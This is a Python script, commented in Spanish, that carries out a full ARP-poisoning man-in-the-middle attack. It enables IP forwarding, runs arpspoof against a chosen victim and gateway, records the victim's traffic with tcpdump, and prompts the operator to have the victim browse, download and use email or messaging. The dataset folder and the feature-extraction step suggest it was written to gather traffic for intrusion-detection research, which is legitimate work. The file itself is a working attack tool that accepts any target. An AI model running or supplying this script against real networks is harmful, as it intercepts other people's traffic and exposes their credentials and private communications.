#!/usr/bin/env python3
"""
ARP-Poison MitM + captura PCAP (versión robusta)
Uso:
  sudo python3 real_mitm_capture.py --victim 192.168.11.66 \
                                    --gateway 192.168.11.1 \
                                    --iface eth0 \
                                    --duration 300
"""
import subprocess, os, time, signal, sys
from datetime import datetime
import argparse

def popen(cmd):
    """Lanza sub-proceso sin output"""
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_mac(ip, iface):
    """Obtiene MAC de una IP usando arping"""
    try:
        result = subprocess.run(f"arping -c 1 -I {iface} {ip}", 
                              shell=True, capture_output=True, text=True, timeout=5)
        for line in result.stdout.split('\n'):
            if 'reply from' in line.lower():
                mac = line.split('[')[1].split(']')[0]
                return mac
    except:
        pass
    return None

def main(victim_ip, gateway_ip, iface, duration):
    print("="*60)
    print("🎯 ATAQUE MitM REAL - ARP POISONING")
    print("="*60)
    print(f"Atacante:  {iface} (esta máquina)")
    print(f"Víctima:   {victim_ip}")
    print(f"Gateway:   {gateway_ip}")
    print(f"Duración:  {duration} segundos")
    print("="*60)
    
    # Verificar conectividad
    print("\n[1/6] Verificando conectividad...")
    if subprocess.run(f"ping -c 1 -W 2 {victim_ip}", shell=True, 
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
        print(f"❌ ERROR: No se puede alcanzar la víctima {victim_ip}")
        print("   Verifica que ambas máquinas estén en la misma red.")
        sys.exit(1)
    
    if subprocess.run(f"ping -c 1 -W 2 {gateway_ip}", shell=True,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
        print(f"❌ ERROR: No se puede alcanzar el gateway {gateway_ip}")
        sys.exit(1)
    
    print("✅ Conectividad OK")
    
    # Obtener MACs
    print("\n[2/6] Obteniendo direcciones MAC...")
    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    
    if victim_mac:
        print(f"✅ Víctima MAC:  {victim_mac}")
    else:
        print(f"⚠️  No se pudo obtener MAC de víctima (continuando...)")
    
    if gateway_mac:
        print(f"✅ Gateway MAC:  {gateway_mac}")
    else:
        print(f"⚠️  No se pudo obtener MAC de gateway (continuando...)")
    
    # Crear directorio para capturas (siempre la misma carpeta)
    capture_dir = os.path.expanduser("~/mitm_dataset/raw")
    os.makedirs(capture_dir, exist_ok=True)
    
    # Nombre único con timestamp
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap = os.path.join(capture_dir, f"mitm_real_{ts}.pcap")
    
    print(f"\n[3/6] Archivo de captura: {pcap}")
    print(f"     (Carpeta: {capture_dir})")
    
    # Habilitar IP forwarding
    print("\n[4/6] Habilitando IP forwarding...")
    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, check=True)
    print("✅ IP forwarding activado")
    
    # Iniciar tcpdump
    print("\n[5/6] Iniciando captura de tráfico...")
    tcpdump = popen(f"tcpdump -i {iface} -w {pcap} 'host {victim_ip} or host {gateway_ip}'")
    time.sleep(2)
    print("✅ tcpdump iniciado")
    
    # Lanzar ARP spoofing
    print("\n[6/6] Iniciando ARP poisoning...")
    print(f"   → Envenenando víctima ({victim_ip})")
    print(f"   → Envenenando gateway ({gateway_ip})")
    
    spoof_victim  = popen(f"arpspoof -i {iface} -t {victim_ip} {gateway_ip}")
    spoof_gateway = popen(f"arpspoof -i {iface} -t {gateway_ip} {victim_ip}")
    time.sleep(3)
    
    print("\n" + "="*60)
    print("🔥 ATAQUE MitM ACTIVO")
    print("="*60)
    print(f"⏱️  Duración: {duration} segundos")
    print("📡 Capturando todo el tráfico de la víctima...")
    print("\n💡 AHORA EN LA VÍCTIMA:")
    print("   - Abre navegador web (HTTP/HTTPS)")
    print("   - Navega por sitios (Google, YouTube, etc.)")
    print("   - Descarga archivos")
    print("   - Usa aplicaciones (WhatsApp Web, email, etc.)")
    print("\n⏹️  Presiona Ctrl+C para detener antes de tiempo")
    print("="*60 + "\n")
    
    try:
        # Mostrar progreso
        for i in range(duration):
            time.sleep(1)
            if (i+1) % 30 == 0:
                print(f"⏱️  {i+1}/{duration}s - Capturando...")
    except KeyboardInterrupt:
        print("\n\n⏹️  Interrumpido por usuario")
    finally:
        print("\n[*] Deteniendo ataque...")
        
        # 1) Detener arpspoof con timeout
        for name, p in [("spoof_victim", spoof_victim), ("spoof_gateway", spoof_gateway)]:
            try:
                p.send_signal(signal.SIGINT)
                p.wait(timeout=5)
                print(f"   ✓ {name} detenido")
            except subprocess.TimeoutExpired:
                print(f"   ⚠️ {name} no respondió a SIGINT, forzando kill")
                p.kill()
                p.wait()
            except Exception as e:
                print(f"   ⚠️ Error deteniendo {name}: {e}")
        
        # 2) Detener tcpdump con timeout
        try:
            tcpdump.send_signal(signal.SIGINT)
            tcpdump.wait(timeout=5)
            print("   ✓ tcpdump detenido")
        except subprocess.TimeoutExpired:
            print("   ⚠️ tcpdump no respondió a SIGINT, forzando kill")
            tcpdump.kill()
            tcpdump.wait()
        except Exception as e:
            print(f"   ⚠️ Error deteniendo tcpdump: {e}")
        
        # 3) Desactivar IP forwarding
        subprocess.run("sysctl -w net.ipv4.ip_forward=0", shell=True)
        print("   ✓ IP forwarding desactivado")
        
        # 4) Restaurar ARP tables (opcional pero recomendado)
        print("[*] Restaurando tablas ARP...")
        if victim_mac and gateway_mac:
            subprocess.run(f"arping -c 3 -I {iface} -S {gateway_ip} -s {gateway_mac} {victim_ip}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("   ✓ Tablas ARP restauradas")
        
        print("\n" + "="*60)
        print("✅ CAPTURA FINALIZADA")
        print("="*60)
        print(f"📁 Archivo guardado: {pcap}")
        
        # Mostrar estadísticas del archivo
        try:
            result = subprocess.run(f"capinfos {pcap}", shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Number of packets' in line or 'File size' in line or 'Capture duration' in line:
                        print(f"   {line.strip()}")
        except:
            print("   (capinfos no disponible, omitiendo estadísticas)")
        
        # Listar todos los archivos en la carpeta
        print(f"\n📂 Archivos en {capture_dir}:")
        try:
            files = sorted([f for f in os.listdir(capture_dir) if f.endswith('.pcap')])
            for i, f in enumerate(files, 1):
                fpath = os.path.join(capture_dir, f)
                size_mb = os.path.getsize(fpath) / (1024*1024)
                print(f"   {i}. {f} ({size_mb:.1f} MB)")
        except Exception as e:
            print(f"   ⚠️ Error listando archivos: {e}")
        
        print("\n📊 Siguiente paso:")
        print(f"   python3 scripts/extract_features.py --input_dir {capture_dir}")
        print("="*60)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("❌ Este script requiere permisos de root")
        print("   Ejecuta: sudo python3 real_mitm_capture.py ...")
        sys.exit(1)
    
    ap = argparse.ArgumentParser(description='Captura tráfico durante ataque MitM real')
    ap.add_argument("--victim",   required=True, help="IP de la víctima")
    ap.add_argument("--gateway",  required=True, help="IP del gateway/router")
    ap.add_argument("--iface",    default="eth0", help="Interfaz de red del atacante")
    ap.add_argument("--duration", type=int, default=300, help="Duración en segundos")
    
    args = ap.parse_args()
    main(args.victim, args.gateway, args.iface, args.duration)